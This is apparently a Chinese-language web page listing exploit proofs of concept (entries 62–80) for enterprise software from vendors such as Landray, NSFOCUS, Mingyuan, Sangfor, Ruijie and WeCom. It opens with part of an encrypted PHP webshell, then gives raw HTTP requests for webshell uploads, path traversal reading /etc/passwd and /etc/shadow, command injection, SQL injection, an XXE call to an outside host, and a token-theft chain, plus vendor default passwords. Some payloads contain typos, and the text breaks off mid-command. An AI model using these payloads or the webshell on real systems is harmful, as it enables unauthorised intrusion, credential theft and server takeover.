&lt;?php @error_reporting(0); session_start(); $key=&quot;e45e329feb5d925b&quot;; //rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded('openssl')) { $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&amp;15]; } } else { $post=openssl_decrypt($post, &quot;AES128&quot;, $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.&quot;&quot;);}} @call_user_func(new C(),$params); ?&gt; 
------WebKitFormBoundaryxRP5VjBKdqBrCixM
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br></div></div><h2 id="_62-蓝凌ekp系统存在未授权访问漏洞"><a href="#_62-蓝凌ekp系统存在未授权访问漏洞" class="header-anchor">#</a> 62.蓝凌EKP系统存在未授权访问漏洞</h2> <p>漏洞描述：蓝凌EKP由深圳市蓝凌软件股份有限公司自出研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。。攻击者可利 用漏洞获取大量敏感信息。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /./ui-ext/./behavior/
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: false
matches: (code.eq(&quot;200&quot;) &amp;&amp; body.contains(&quot;ekp_server.log&quot;))
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="_63-蓝凌-oa-rce"><a href="#_63-蓝凌-oa-rce" class="header-anchor">#</a> 63.蓝凌-OA-RCE</h2> <p>通过文件上传--&gt;解压--&gt;获取webshell，前台漏洞</p> <p>漏洞路径：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/api///sys/ui/sys_ui_extend/sysUiExtend.do
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: /
Connection: Keep-Alive
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
var={&quot;body&quot;:{&quot;file&quot;:&quot;file:///etc/passwd&quot;}}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="_64-绿盟-nf-下一代防火墙-任意文件上传漏洞"><a href="#_64-绿盟-nf-下一代防火墙-任意文件上传漏洞" class="header-anchor">#</a> 64.绿盟 NF 下一代防火墙 任意文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host:
--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;compose.php&quot;

&lt;?php eval($_POST['cmd']);?&gt;
--4803b59d015026999b45993b1245f0ef--


POST /mail/include/header_main.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
Host:

cmd=phpinfo();	
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h2 id="_65-绿盟-sas堡垒机-exec-远程命令执行漏洞"><a href="#_65-绿盟-sas堡垒机-exec-远程命令执行漏洞" class="header-anchor">#</a> 65.绿盟 SAS堡垒机 Exec 远程命令执行漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="_66-绿盟-sas堡垒机-local-user-php-任意用户登录漏洞"><a href="#_66-绿盟-sas堡垒机-local-user-php-任意用户登录漏洞" class="header-anchor">#</a> 66.绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&amp;method=login&amp;user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="_67-绿盟sas安全审计系统任意文件读取漏洞"><a href="#_67-绿盟sas安全审计系统任意文件读取漏洞" class="header-anchor">#</a> 67.绿盟sas安全审计系统任意文件读取漏洞</h2> <p><code>/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd</code></p> <div class="language- line-numbers-mode"><pre class="language-text"><code>/api/virtual/home/status?cat=../../../../../../../../etc/passwd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&amp;method=login&amp;user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h2 id="_68-明源erp存在sql时间盲注"><a href="#_68-明源erp存在sql时间盲注" class="header-anchor">#</a> 68.明源ERP存在SQL时间盲注</h2> <p>漏洞描述：明源地产ERP系统具有丰富的房地产行业经验和定制化功能,可以适应不同企业的需求。该系统存在sqI注 入漏洞，可获取服务器权限</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>relative: req0 &amp;&amp; req1
session: false
requests:
- method: GET
timeout: 13
path: /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAT%20'0:0:5'--&amp;ywtype=GETParentProjectName
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: (time.gt(&quot;5&quot;)) &amp;&amp; time.lt(&quot;10&quot;)
- method: GET
timeout: 10
path: /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAT%20'0:0:0'--&amp;ywtype=GETParentProjectName
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: time.lt(&quot;5&quot;)

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="_69-明源云-erp-apiupdate-ashx-文件上传漏洞"><a href="#_69-明源云-erp-apiupdate-ashx-文件上传漏洞" class="header-anchor">#</a> 69.明源云 ERP ApiUpdate.ashx 文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: target.com
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 856

{{unquote(&quot;PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&amp;\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28&lt;\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00&quot;)}}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="_70-企业微信-私有化版本-敏感信息泄露漏洞"><a href="#_70-企业微信-私有化版本-敏感信息泄露漏洞" class="header-anchor">#</a> 70.企业微信（私有化版本）敏感信息泄露漏洞</h2> <p>紧急通知，长亭报出企业微信存在信息泄露0day！目前已在准备预警，请注意！</p> <p>企业微信URL/cgi-bin/gateway/agentinfo</p> <p>接口未授权情况下可直接获取企业微信secret等敏感信息</p> <p>受影响版本：2.5.x、2.6.930000、以下；</p> <p>不受影响：2.7.x、2.8.x、2.9.x；</p> <p>危害：</p> <p>1、可导致企业微信全量数据被获取、文件获取，</p> <p>2、存在使用企业微信轻应用对内发送钓鱼文件和链接等风险。</p> <p>修复方法：</p> <p>1、在waf上设置一个规则，匹配到/cgi-bin/gateway/agentinfo路径的进行阻断；</p> <p>2、联系厂家进行获取修复包；</p> <p>3、官方通报及补丁地址</p> <p>复现及漏洞详情分析：</p> <p>第一步：，通过泄露信息接口可以获取corpid和corpsecret</p> <p>https://&lt;企业微信域名&gt;/cgi-bin/gateway/agentinfo</p> <p>第二步，使用corpsecret和corpid获得token</p> <p>https://&lt;企业微信域名&gt;/cgi-bin/gettoken?corpid=ID&amp;corpsecret=SECRET</p> <p>第三步，使用token访问诸如企业通讯录信息，修改用户密码，发送消息，云盘等接口</p> <p>https://&lt;企业微信域名&gt;/cgi-bin/user/get?access_token=ACCESS_TOKEN&amp;userid=USERID</p> <h2 id="_71-启明星辰-4a-统一安全管控平台-getmater-信息泄漏"><a href="#_71-启明星辰-4a-统一安全管控平台-getmater-信息泄漏" class="header-anchor">#</a> 71.启明星辰-4A 统一安全管控平台 getMater 信息泄漏</h2> <p>启明星辰集团4A统一安全管控平台实现IT资源集中管理,为企业提供集中的账号、认证、授权、审计管理技术支撑及配套流程,提升系统安全性和可管理能力。可获取相关人员敏感信息。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>poc:
  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /accountApi/getMaster.do
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/65.0.881.36 Safari/537.36
    follow_redirects: true
    matches: (code.eq(&quot;200&quot;) &amp;&amp; body.contains(&quot;\&quot;state\&quot;:true&quot;))
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>修复建议：</p> <p>限制文件访问</p> <h2 id="_72-契约锁电子签章系统-rce"><a href="#_72-契约锁电子签章系统-rce" class="header-anchor">#</a> 72.契约锁电子签章系统 RCE</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /callback/%2E%2E;/code/upload HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type:multipart/form-data;

boundary=----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
Content-Disposition: form-data; name=&quot;type&quot;;

TIMETASK
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;qys.jpg&quot;

马儿

----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h2 id="_73-任我行-crm-smsdatalist-sql注入漏洞"><a href="#_73-任我行-crm-smsdatalist-sql注入漏洞" class="header-anchor">#</a> 73.任我行 CRM SmsDataList SQL注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /SMS/SmsDataList/?pageIndex=1&amp;pageSize=30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

Keywords=&amp;StartSendDate=2020-06-17&amp;EndSendDate=2020-09-17&amp;SenderTypeId=00000000*
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h2 id="_74-锐捷-nbr-路由器-fileupload-php-任意文件上传漏洞"><a href="#_74-锐捷-nbr-路由器-fileupload-php-任意文件上传漏洞" class="header-anchor">#</a> 74.锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /ddi/server/fileupload.php?uploadDir=../../321&amp;name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;111.php&quot;
Content-Type: image/jpeg

&lt;?php phpinfo();?&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h2 id="_75-锐捷交换机-web-管理系统-excu-shell-信息泄露"><a href="#_75-锐捷交换机-web-管理系统-excu-shell-信息泄露" class="header-anchor">#</a> 75.锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露</h2> <p>漏洞描述：锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞</p> <p>批量扫描工具：
https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /EXCU_SHELL HTTP/1.1

Host: 

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36

Accept-Encoding: gzip, deflate

Accept: */*

Connection: close

Cmdnum: '1'

Command1: show running-config

Confirm1: n
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h2 id="_75-赛思succezbi前台任意文件上传"><a href="#_75-赛思succezbi前台任意文件上传" class="header-anchor">#</a> 75.赛思SuccezBI前台任意文件上传</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POsT /succezbi/sz/commons/form/file/uploadChunkFile:guid=../tomcat/webapps/ROOT/&amp;chunk=ss.jsp HTTP/1.1
Host: 10.168.4.99:808
Content-Length: 49564
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8GeAY18LCxR7XnVp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10 15 7) Applewebkit/537.36 (KHTML, likeGecko) Chrome/106.9.. Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;g=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip， deflate
Accept-Language: zh-CN,zh;g=0.9
Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2
Connection: close

-----WebKitFormBoundarv8GeAY18LCXR7XnVPContent-Disposition: 
form-data; name=&quot;file&quot;; filename=&quot;ww'
Content-Type: image/jpeg

webshell
-----WebKitFormBoundarv8GeAY18LCXR7XnVP
Content-Disposition: form-data; name=&quot;tijiao'

confirm
------WebKitFormBoundarv8GeAY18LCXR7XnVP--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>木马地址：ww_ss.jsp</p> <h2 id="_76-深信服sg上网优化管理系统catjs-php任意文件读取漏洞"><a href="#_76-深信服sg上网优化管理系统catjs-php任意文件读取漏洞" class="header-anchor">#</a> 76.深信服SG上网优化管理系统catjs.php任意文件读取漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /php/catjs.php


[&quot;../../../../../../../../etc/shadow&quot;]
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_77-深信服报表"><a href="#_77-深信服报表" class="header-anchor">#</a> 77.深信服报表</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /rep/login HTTP/1.1 
Host: 
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 
Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
Accept-Encoding: gzip deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: cross-site 
Pragma: no-cache 
Cache-Control: no-cache14 
Te: trailers 
Connection: close 
Content-Type:application/x-www-form-urlencoded 
Content-Length: 126 

clsMode=cls_mode_login&amp;index=index&amp;log_type=report&amp;page=login&amp;rnd=0.7550103466497915&amp;userID=admin%0Aid -a %0A&amp;userPsw=tmbhuisq
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>poc2</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /rep/login HTTP/1.1 
Host: 
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 
Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
Accept-Encoding: gzip deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: cross-site 
Pragma: no-cache 
Cache-Control: no-cache14 
Te: trailers 
Connection: close 
Content-Type:application/x-www-form-urlencoded 
Content-Length: 126 

clsMode=cls_mode_login%0Awhoami%0A&amp;index=index&amp;log_type=report&amp;loginType=account&amp;page=login&amp;rnd=0&amp;userID=admin&amp;userPsw=123
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="_78-深信服数据中心管理系统-xml-实体注入漏洞"><a href="#_78-深信服数据中心管理系统-xml-实体注入漏洞" class="header-anchor">#</a> 78.深信服数据中心管理系统 XML 实体注入漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>GET /src/sangforindex HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)
Accept:
text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: text/xml
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: Keep-alive
Content-Length: 135
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE root [
&lt;!ENTITY rootas SYSTEM &quot;http://dnslog&quot;&gt;
]&gt;
&lt;xxx&gt;
&amp;rootas;
&lt;/xxx&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h2 id="_79-深信服应用交付系统命令执行漏洞"><a href="#_79-深信服应用交付系统命令执行漏洞" class="header-anchor">#</a> 79.深信服应用交付系统命令执行漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /rep/login
Host:10.10.10.1:85

clsMode=cls_mode_login%0Als%0A&amp;index=index&amp;log_type=report&amp;loginType=account&amp;page=login&amp;rnd=0&amp;userID=admin&amp;userPsw=123
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_80-天钥网关前台sql注入"><a href="#_80-天钥网关前台sql注入" class="header-anchor">#</a> 80.天钥网关前台SQL注入</h2> <p>天钥默认账号密码:</p> <p>sysuseradmin/ sua_password$123</p> <p>sysauditor/ sa_password$123</p> <p>sysadmin/password$123</p> <p>sysadmin1/sysadmin111111</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /ops/index.php?c=Reportguide&amp;a=checkrn HTTP/1.1
Host: ****
Connection: close
Cache-Control: max-age=0
sec-ch-ua: &quot;Chromium&quot;;v=&quot;88&quot;, &quot;Google Chrome&quot;;v=&quot;88&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Cookie: ****
Content-Type: application/x-www-form-urlencoded
Content-Length: 39


checkname=123&amp;tagid=123
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>sqlmap -u 